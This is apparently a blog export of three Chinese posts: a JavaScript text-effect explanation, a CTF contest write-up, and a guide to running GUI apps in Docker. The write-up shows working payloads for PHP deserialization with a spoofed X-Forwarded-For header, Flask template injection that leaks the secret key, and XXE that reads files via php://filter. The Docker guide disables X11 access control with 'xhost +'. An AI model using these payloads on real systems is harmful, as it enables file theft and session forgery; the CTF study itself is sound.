本事是单线程的语言，所以如果这里以普通循环来实现的话会让其他的任务卡住，看来 这里异步的递归就是循环 呀，嗯，学到了。 0x12 createDocumentFragment 的含义从最终效果来看，这是一个不断更新文档元素的过程，通过查看代码可以发现，实际负责插入随机字符的是名为 m 的这个函数，注意到在其 for 循环中，有着名为 createDocumentFragment 的函数调用，这就又触及到我的盲区了，遂继续求助网络，得知该函数可以很好地工作在频繁更新元素的环境下。 0x2 结语做好上述准备后，就可以安心地读代码了。其本身并没有什么难度，在去掉了用来混淆的无关代码以及对变量和函数进行语义化后就得到了当前页面中使用的 js 代码了。有兴趣的朋友们可以看一下～ // 作为 web 坑的新人，非常渴望找到一个可以交流技术或可以一起合作写项目的个人或 // 团体，如果您对此有兴趣的话，非常欢迎通过右侧的联系方式与我交流～ (()=>{ let div = document.querySelector('#yuren-content'); let sequences = [\"一二三四五，上山打老虎。\", \"老虎没打到，打到小松鼠。\"]; let colors = [\"rgb(110,64,170)\", \"rgb(150,61,179)\", \"rgb(191,60,175)\", \"rgb(228,65,157)\", \"rgb(254,75,131)\", \"rgb(255,94,99)\", \"rgb(255,120,71)\", \"rgb(251,150,51)\", \"rgb(226,183,47)\", \"rgb(198,214,60)\", \"rgb(175,240,91)\", \"rgb(127,246,88)\", \"rgb(82,246,103)\", \"rgb(48,239,130)\", \"rgb(29,223,163)\", \"rgb(26,199,194)\", \"rgb(35,171,216)\", \"rgb(54,140,225)\", \"rgb(76,110,219)\", \"rgb(96,84,200)\"]; function getOneColor() { return colors[Math.floor(Math.random()*colors.length)]; } function getSomeChar(r) { let n=document.createDocumentFragment(); for (let i=0; i","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"NEXCTF 招新赛 WirteUP","slug":"NEXCTF-WriteUp","date":"2019-11-20T13:41:13.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2019/11/20/NEXCTF-WriteUp/","link":"","permalink":"/2019/11/20/NEXCTF-WriteUp/","excerpt":"","text":"0x0 前言本文是上个月学校 NEX 战队招新赛中部分题目的 WriteUP ，因为赛事从结果上来说还是很令人高兴的，所以一直都想单独写一篇博客来记录这些题目，但是因为学校的一堆事情+拖延症的问题，差不多过了1个月才着手做这件事… 0x1 相关环境12345Python v3.7.4requests v2.22.0Flask v1.1.1Binwalk v2.1.1dd 0x2 各WriteUP0x20 Web 签到12345678910111213141516171819202122&lt;?php highlight_file(__FILE__);class ttt &#123; public function __destruct() &#123; try &#123; echo file_get_contents(\"/flag\"); &#125; catch (Exception $e) &#123; &#125; &#125; &#125;if($_GET['get'] === '1')&#123; if($_POST['post'] === '1') &#123; if($_SERVER[\"HTTP_X_FORWARDED_FOR\"] === '127.0.0.1') &#123; unserialize($_POST['class']); &#125; &#125;&#125; 代码如上，分析知 ttt 类的析构函数会输出 flag 内容，而代码中存在 unserialize 函数，故可知该代码存在反序列化漏洞。下面来构造 ttt 类的序列化内容，代码如下： 123&lt;?php class ttt &#123;&#125; echo serialize(new ttt); 那么现在解决问题的关键就是构造满足三个 if 条件的请求，以使程序流程到达反序列化函数那里。get 和 post 都是常规的请求，这里可以了解一下 X-Forwarded-For ，然后可通过 Python3+Requests 构造如下请求来获取 flag： 1__import__('requests').post('http://&lt;ip&gt;:&lt;port&gt;/?get=1', data=&#123;'post':'1','class':'O:3:\"ttt\":0:&#123;&#125;'&#125;, headers=&#123;'X-Forwarded-For':'127.0.0.1'&#125;).content 0x21 Baby Flask源码 提取码: upiv 可以看到，路由 /admin 可以获取到 Flag ，该视图函数通过验证 session 中 admin 的值来返还不同的内容；而因为 Flask 是客户端session的模式，故这个值可以人为修改。 那么解题的目标就变成了通过寻找注入点来获取 secretkey ，查看代码知调用 render_template_string 函数时第一个参数传递了 template.replace，将 模版中的 $remembered_name 替换成了 session 中 name 的值，通过查看 index.html 可知该占位符出现在 Info 模块和 Author 输入框的 value 属性中，故可通过合理控制 Author 中的值来实现注入。 而在 app.py 中，通过定义 safe_input 函数针对 post 过来的输入进行了过滤，查看代码可知输入中不能出现 ()[]_ 这几种字符，所以可以通过全局变量 config 来获取secretkey。 拿到key以后，通过构造 session ，并使用浏览器自带的开发者工具将原来的值替换掉即可通过访问 /admin 拿到 Flag。 0x22 Baby xxe12345678910111213141516171819&lt;?php libxml_disable_entity_loader(false);$xmlfile = $_POST['name'];if (empty($xmlfile)) &#123; highlight_file(__FILE__);&#125; else if (stristr($xmlfile, \"xml\")) &#123; $xmlfile = str_ireplace(\"&lt;!entity\", \"nonono\", $xmlfile);&#125; else &#123; $xmlfile = '&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root[ &lt;!ENTITY all \"'.$xmlfile.'\"&gt;]&gt;&lt;root&gt;&amp;all;&lt;/root&gt;';&#125;$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);echo ($creds);?&gt; 提示信息：Flag 在 ./flag.php 中 尝试直接访问 flag.php 发现内容为 flag{f4ke_fl4g} ，也就是假 Flag ；那么根据提示来分析，很有可能真正的 Flag 被写在 php 代码的注释中或是有 if 条件来限制，所以首要的目标是拿到 flag.php 的代码。 通过分析上面的代码，可以发现 else 中 xmlfile 被双引号扩住，所以不能通过写入 SYSTEM 关键字来达到 xxe 的效果，而 else if 中只要出现 xml 字样就会替换 entity 关键字，但没有进一步的过滤措施，故可以通过载入 dtd 的方式实现注入。 题目本身是放在服务器上的，故想要访问自定义的 dtd 文件需要具备公网 ip 的设备，这里的复现因为在本地，就不做相关处理了。假设文件名为 tmp.dtd ，内容如下： 1&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;&gt; 这里要注意的是，由于最后 php 解析的是 xml 内容，而 flag.php 代码中存在诸如 &lt;&gt; 的符号，会对解析造成干扰，故采用 php 伪协议将文件内容以 base64 进行编码。 然后通过 Python+Requests 发送如下 POST 请求 1__import__(\"requests\").post(\"http://&lt;ip&gt;:&lt;port&gt;/&lt;题目文件名&gt;\", data=&#123;\"name\":'&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root SYSTEM \"tmp.dtd\"&gt;&lt;root&gt;&amp;test;&lt;/root&gt;'&#125;).content 将得到的 base64 内容解码即可得到 php 代码，经过相关处理得到 Flag。 0x23 ScriptBoy文件包 提取码: gxfa 题目描述：筛选出所有文件中前两个数字都是4位的一行，将选出的每一行的第20位组成一个字符串， flag就是这个字符串的32位小写MD5的值 分析文件结构后可以用如下脚本构造 Flag： 12345678910111213141516from hashlib import md5result = []for i in range(1, 101): filename = \"./\"+str(i)+\"/\"+str(i)+\".txt\" with open(filename) as f: content = f.readlines() for tmp in content: split_tmp = tmp.split('----') if len(split_tmp[0])==len(split_tmp[1])==4: result.append(tmp[19])print(md5(''.join(result).encode('utf8')).hexdigest()) 0x24 ljmisc图片 提取码: mnck ⬆️打开链接前请做好心理准备 拿到图片后，执行 binwalk 1000.png 即可发现从 0x8B3F4 处开始隐藏了一个压缩包，故可执行 dd if=1000.png of=test.zip skip=0x8b3f4 bs=1 来将它提取出来。据说这个包经过了伪加密，但是当时因为环境是 MacOS ，所以也没有经历解密的操作，这里也就先不记录相关内容了。 打开后出现一个新的压缩包和两张图片，新的压缩包是真的被加密过的，所以要从另外两张图片寻找解压密码的线索。 两张图片并不能看出什么分别，但是大小却差了很多，故可以猜测是盲水印。 使用bwm处理后可以获得解压密码为 glgjssy_qyhfbqz，输入后即可打开压缩包到达第三层。 解压后的文件是一个充满0和1的文件，当时看了好久都没什么头绪。但是在我万能的舍友的帮助下，猜测这可能是描述了一张二维码，故通过以下脚本将1的位置填充为黑，0的位置填充为白： 123456789101112131415161718192021from PIL import ImageMAX = 256pic = Image.new(\"RGB\",(MAX, MAX))str = ''with open('./bin.txt') as f: str = f.read()i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save(\"flag.png\") 扫描二维码即可获取 Flag。 0x3 总结本文记录了本次招新赛中的部分题目，其他的题目因为难以复现而暂时无法记录。 技术上的话题就到此为止了，下面是一些题外话： 15Zug5Li65piv56ys5LiA5qyh5YGaIGN0Zu+8jOaJgOS7peinieW+l+aXoOiuuuWmguS9lemDveimgeWGmeS4gOS6m+S4nOilv++8jOWPr+iDveaYr+S9nOS4uuaWsOaWueWQkeeahOi1t+eCue+8jOS5n+WPr+iDveaYr+S4uuS6huaWueS+v+aXpeWQjueahOWbnuW/huOAggoK5pyA6L+R6YGH5Yiw5LqG5ZCE56eN5LqL5oOF77yM55Sx5q2k5Lmf5oOz5LqG5b6I5aSa44CC5bCx5Zyo5LiK5Liq5a2m5pyf77yM5oiR5Zug5Li65b2T5pe255y85YWJ5q+U6L6D55+t5rWF6ICM5ouS57ud5LqG5LiA5Liq5py65Lya77yM5rKh5oOz5Yiw6L+Z5a2m5pyf5Y205Zug5q2k6ZSZ6L+H5LqG5b6I5aSa5LqL5oOF44CC5a+55LqO6L+Z5Lu25LqL77yM6K+05LiN5ZCO5oKU5piv5LiN5Y+v6IO955qE77yM5L2G5oiR5Y+I5LiN5piv5LiA5Liq5Lya55So6L+H5Y675Y+N5aSN5oqY56Oo6Ieq5bex55qE5Lq677yM6YCJ6ZSZ5LqG5bCx5piv6YCJ6ZSZ5LqG77yM5Lmf5rKh5LuA5LmI5aW96K+055qE44CCCgrog73lpJ/ov5vlhaUgTkVYIOaYr+aIkeayoeacieaDs+WIsOeahO+8jOi/meS5n+iuuOaYr+WPpuS4gOS4quacuuS8muOAguS4jeeuoeaAjuS5iOivtO+8jOWug+S7juWPpuS4gOS4quWxgumdouiuqeaIkeeci+WIsOS6huW+iOWkmuS4nOilv++8jOi/meS+v+Wkn+S6huOAggoK6LCo5Lul5q2k5paH6K2m6YaS5pyq5p2l55qE6Ieq5bex44CC","categories":[{"name":"CTF","slug":"CTF","permalink":"/categories/CTF/"}],"tags":[]},{"title":"在 Docker for MacOS 中运行 GUI 程序","slug":"Run-GUI-in-Docker","date":"2019-10-14T15:04:14.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2019/10/14/Run-GUI-in-Docker/","link":"","permalink":"/2019/10/14/Run-GUI-in-Docker/","excerpt":"内容包括：前言+环境+具体操作+原理","text":"内容包括：前言+环境+具体操作+原理 0x0 前言在初步接触了 Docker 后，突然萌生了一个“可不可以在其中跑GUI程序的念头”，遂急忙STFW&amp;&amp;RTFM，并在查阅了相关的一些文档后，成功在本地运行了容器内的GUI测试程序，下面记录一下相关的工作和原理。 0x1 相关环境12Docker version 18.09.2XQuartz 2.7.11（xorg-server 1.18.4) 以上软件均可通过 homebrew 进行安装 0x2 具体操作 XQuartz -&gt; 偏好设置 -&gt; 安全性 -&gt; 勾选“允许从网络客户端连接” -&gt; 退出程序； 终端键入 xhost +（注意两者之间的空格）重新启动 XQuartz； 使用诸如 nmap 类的工具查看 6000 端口是否被 X11 服务占用，如果已经被占用即可继续下一步操作，如果没有被占用的话…因为没遇到过所以我也不知道怎么办:-P； 在 run 或 exec 容器时加入-e DISPLAY=host.docker.internal:0参数，比如我这里通过对一个现有的，已经安装过 xarclock 时钟小程序的容器 toyOS 执行docker exec -ite DISPLAY=host.docker.internal:0 toyOS /usr/bin/xarclock，就会在我的本地出现一个小时钟的GUI程序； 0x3 相关原理在 Linux 系统及一些 Unix-like 系统中，有着 X Window System 的概念（下面简称为 X系统），用户的 GUI 程序作为 X Client 向本地或远程的 X Server 交互，以得到底层的支持来在运行 X Server 的设备上绘制出图像，而 XQuartz 则是一款面向 MacOS 系统的 X系统，（在我理解的层面上）也提供了如上的功能支持。 于是在这个原理的支撑下，如何让 Docker 运行 GUI 程序 这个问题就被转化成了 如何在宿主机运行 X Server 以及 如何让 Docker 中的 X Client 与宿主机的 X Server 实现交互，下面分别来解决这两个问题： 0x31 如何在宿主机运行 X Server在 X系统的定义中可以看到，本身该系统就可以支持以网络为基础的 C-S 模型（虽然关注点更倾向于服务方），XQuartz 作为它的一种实现当然也不例外。但是出于安全上的考虑，XQuartz 默认是不允许通过网络进行交互的。要关闭这个限制，有两个方面要实现，分别对应 具体操作 中的1，2两个操作，第一个操作就像字面上的意思一样，关闭了网络连接限制，第二个操作则是关闭了连接鉴定（access control），可以通过运行 man xhost 来查看其 Man Page 以获得更多的信息。需要注意的是，因为本次实验的操作都是在本地实现的，所以完全关闭了连接鉴定，这在涉及到远程操作时是非常不安全的。 执行了上述步骤且 6000 端口被监听（默认情况）时，我们就成功在宿主机上运行起了 X Server，接下来就要解决第三个问题了。 0x32 如何让 Docker 中的 X Client 与宿主机的 X Server 实现交互作为 X Client 的程序如果想与 X Server 进行交互，大致分为两种方式： 在命令后加 --display 参数并指明相关的位置 用户提前设置好环境变量 DISPLAY ，程序从该变量获得相关信息 这里我们采用第二种方式，故在启动容器时通过 -e 参数为其设置 DISPLAY 变量，现在的问题在于，如何解释变量的值 host.docker.internal:0 呢？ 对于该变量中，冒号前面的部分，Docker 官方文档中有如下解释： The host has a changing IP address (or none if you have no network access). From 18.03 onwards our recommendation is to connect to the special DNS name host.docker.internal, which resolves to the internal IP address used by the host. 也就是说，这个值本质上是获得了宿主机的内部IP，为了验证这一点，可以通过 ifconfig 命令来查看宿主机实际的IP，并将 DISPLAY 的值换成 your_ip:0 ，可以发现和前面一样可以运行。之所以本次实验采用了前者，是因为要获取实际IP，第一是过程很麻烦，第二是设备要处于联网的状态下，而在文档的描述中可以看到 (or none if you have no network access) 这句话，也就是说，这种参数设置在无网络的条件下也可以正常运行。 那么 DISPLAY 的值就可以被解释为 your_ip:0 了，关于这个格式，其实它的完整形式为 your_ip: display_number. screen_number ，在本实验中其实可以写为 host.docker.internal:0.0，display_number 和 screen_number 均从0开始计数，前者表示一个输入流的标号（输入流包括显示器，键盘，鼠标等），后者表示输入流中某个具体的显示屏，因为很少有人使用多屏幕，所以 screen_number 多数情况下均为0，也就可以省略掉了。 而对于 display_number，X11 protocol 官方文档中有如下描述： For TCP connections, displays on a given host are numbered starting from 0, and the server for display N listens and accepts connections on port 6000 + N. 也就是说，这个值实际上取决于宿主机上 X11 服务占用的端口，用端口号减掉6000即可，这就是上述命令中冒号后面的0的具体含义。为了验证这一点，可以使用 socat 工具运行 socat tcp-listen:6100,reuseaddr,fork tcp:localhost:6000 命令，将6100端口的消息转交给6000端口，这样按照上面的描述，DISPLAY 变量的值就可以为 host.docker.internal:100 ，替换后执行完整命令，可以发现一样能运行GUI测试程序。","categories":[{"name":"Docker","slug":"Docker","permalink":"/categories/Docker/"}],"tags":[]}]}